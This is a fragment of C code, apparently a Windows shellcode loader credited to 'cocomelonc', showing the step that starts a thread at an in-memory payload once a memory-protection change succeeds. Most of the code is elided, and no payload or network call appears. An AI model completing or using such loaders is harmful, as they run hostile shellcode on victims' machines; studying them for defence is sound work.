...
int main(void) {
  ...
  if ( rv != 0 ) { //change memory success or false
    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) my_payload_mem, 0, 0, 0);
    WaitForSingleObject(th, -1);//use thread to run shellcode
    //have a lot of method to run our shellcode
  }
  return 0;
}

//this is a simple loader from cocomelonc
